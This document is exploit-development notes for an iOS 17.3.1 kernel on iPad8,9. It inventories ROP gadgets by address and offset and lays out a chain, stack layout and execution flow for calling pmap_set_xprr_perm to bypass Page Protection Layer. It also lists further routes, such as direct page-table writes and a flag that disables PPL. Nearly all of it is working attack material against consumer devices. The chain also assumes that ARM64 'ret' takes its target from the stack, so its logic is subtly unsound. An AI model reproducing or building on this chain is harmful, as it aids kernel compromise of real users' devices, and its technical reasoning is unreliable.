# ROP Gadget Analysis for iOS 17.3.1 (iPad8,9) PPL Bypass

## Summary

Found viable ROP gadgets in kernelcache.decompressed for calling pmap_set_xprr_perm.

## Gadget Inventory

| Gadget Type | Count | First Address |
|-------------|-------|---------------|
| ldr x0, [sp, #imm] | 9061 | 0xfffffff007d5ef34 |
| ldr x1, [sp, #imm] | 3913 | 0xfffffff0075290c4 |
| ldr x2, [sp, #imm] | 2070 | 0xfffffff007d60ad4 |
| ldr x3, [sp, #imm] | 813 | 0xfffffff007d4c6c8 |
| ldp x0, x1, [sp], #16 | 7 | 0xfffffff007d516dc |
| ldp x1, x2, [sp], #16 | 1 | 0xfffffff009f94814 |
| ldp x2, x3, [sp], #16 | 6 | 0xfffffff007d5308c |
| ldp x29, x30, [sp], #imm | 0 | - |
| blr Xn | 147 | 0xfffffff007d58578 |
| ret | 30504 | 0xfffffff007d4c07c |
| ldr x8, [sp, #imm] | 19002 | 0xfffffff007d5eb08 |

## Selected ROP Chain

Goal: Call pmap_set_xprr_perm(pai, expected_perm, new_perm)

### Gadget Addresses

1. **ldp x0, x1, [sp], #16; ret**
   - Address: 0xfffffff007d516dc
   - File offset: 0xd4d6dc
   - Stack adjust: +16

2. **ldp x2, x3, [sp], #16; ret**
   - Address: 0xfffffff007d5308c
   - File offset: 0xd4f08c
   - Stack adjust: +16

3. **ldr x8, [sp]; ret** (imm=0)
   - Address: 0xfffffff007d6642c
   - File offset: 0xd6242c
   - Stack adjust: +0

4. **blr x8**
   - Address: 0xfffffff00a340b64
   - File offset: 0x333cb64

### Stack Layout

`
[sp + 0x00] = pai (physical page index)        -> x0
[sp + 0x08] = expected_perm (3 = PPL_RW)       -> x1
[sp + 0x10] = GADGET_LDP_X2_X3                 -> next gadget
[sp + 0x18] = new_perm (1 = KERN_RW)           -> x2
[sp + 0x20] = GADGET_LDR_X8                    -> next gadget
[sp + 0x28] = func_addr (pmap_set_xprr_perm)   -> x8
[sp + 0x30] = GADGET_BLR_X8                    -> blr x8
`

### Execution Flow

1. Start at GADGET_LDP_X0_X1 (0xfffffff007d516dc)
   - Pops x0=pai, x1=expected_perm
   - Stack advances by 16
   - Returns to next address on stack: GADGET_LDP_X2_X3

2. GADGET_LDP_X2_X3 (0xfffffff007d5308c)
   - Pops x2=new_perm, x3=padding
   - Stack advances by 16
   - Returns to next address: GADGET_LDR_X8

3. GADGET_LDR_X8 (0xfffffff007d6642c)
   - Loads x8=func_addr from [sp]
   - Returns to next address: GADGET_BLR_X8

4. GADGET_BLR_X8 (0xfffffff00a340b64)
   - Calls pmap_set_xprr_perm via blr x8

## Challenges

1. **Stack Pivot Required**: Need to redirect execution to our ROP chain on the kernel stack
2. **PAC on Return Addresses**: Return addresses may need PAC authentication
3. **PPL-Protected Page Tables**: PTE addresses themselves may be PPL-protected

## Alternative Approaches

1. **Direct PTE Write**: If PTE is not PPL-protected, can modify XPRR bits directly
2. **Find pmap_ppl_disable Flag**: Search for boolean flag that disables PPL entirely
3. **Use Existing Exploit Stack**: Leverage the current exploit's stack frame for ROP

## Files Generated

- rop_gadgets.json: Full gadget inventory
- rop_gadgets_x8.json: x8-specific gadgets
- find_rop_gadgets.py: Gadget scanner script
- find_x8_gadgets.py: x8 gadget scanner
- build_rop_chain.py: Chain builder
